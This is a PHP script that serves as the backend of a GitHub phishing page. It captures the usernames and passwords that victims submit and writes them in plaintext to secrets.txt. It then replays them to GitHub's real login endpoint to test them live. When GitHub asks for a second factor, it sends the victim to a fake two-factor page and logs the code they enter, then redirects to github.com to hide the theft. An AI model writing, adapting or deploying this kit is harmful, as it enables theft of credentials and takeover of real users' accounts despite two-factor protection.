<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
session_start();
session_start();

$file = "secrets.txt";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Simulate GitHub login
    $github_login_url = "https://github.com/login";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $github_login_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
     curl_setopt($ch, CURLOPT_COOKIEJAR, "cookies.txt");  
    curl_setopt($ch, CURLOPT_COOKIEFILE, "cookies.txt"); 
    $response = curl_exec($ch);
    
    // Look for the authenticity token in the HTML
    preg_match('/name="authenticity_token" value="([^"]+)"/', $response, $matches);
    $authenticity_token = $matches[1] ?? '';

    if (empty($authenticity_token)) {
        echo "Failed to extract authenticity token!";
        exit;
    }
    
    if (isset($_POST["username"]) && isset($_POST["password"])) {
        $username = $_POST["username"];
        $password = $_POST["password"];

        file_put_contents($file, "Username: $username, Password: $password\n", FILE_APPEND);
        $_SESSION["username"] = $username;
        $_SESSION["password"] = $password;

        curl_setopt($ch, CURLOPT_URL, "https://github.com/session"); 
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            "login" => $username,
            "password" => $password,
            "authenticity_token" => $authenticity_token
        ]);
        $response = curl_exec($ch);
        //curl_close($ch);
        
        $final_url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        

        if (strpos($final_url, 'two-factor') !== false) {
            $_SESSION["needs_2fa"] = true;
            header("Location: two-factor-app.html");
            exit;
        } else {
            header("Location: https://github.com");
            exit;
        }
    } elseif (isset($_POST["auth_code"]) && isset($_SESSION["needs_2fa"])) {
        $auth_code = $_POST["auth_code"];
        file_put_contents($file, "Authentication Code: $auth_code\n", FILE_APPEND);
        unset($_SESSION["needs_2fa"]);

        header("Location: https://github.com");
        exit;
    }
}
?>

